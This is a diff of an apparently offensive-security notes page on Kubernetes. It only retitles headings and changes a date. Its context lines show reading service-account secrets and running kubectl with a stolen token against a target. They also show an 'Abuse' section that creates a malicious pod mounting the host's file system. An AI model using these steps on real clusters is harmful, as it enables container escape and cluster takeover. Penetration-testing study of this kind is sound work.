@@ -1,6 +1,6 @@
 ---
 title: "Kubernetes"
-date: 2024-7-22
+date: 2025-7-25
 tags: ["Token-Based Authentication", "File System Permissions Vulnerabilities", "File System Mounting", "Kubernetes", "Container"]
 ---
 
@@ -16,7 +16,7 @@ tags: ["Token-Based Authentication", "File System Permissions Vulnerabilities", 
 /run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
-### Basic Commands
+### General
 
 ```console
 # List all namespaces
@@ -67,7 +67,7 @@ kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describ
 
 ---
 
-### Abuse #1: Mount host's file system
+### Abuse #1: Mount host's File System
 
 #### 1. Create a Malicious YAML (Template)
 
@@ -94,7 +94,7 @@ spec:
   hostNetwork: true
 ```
 
-#### 2. Create a new pod
+#### 2. Create a New Pod
 
 ```console
 kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> apply -f test.yaml
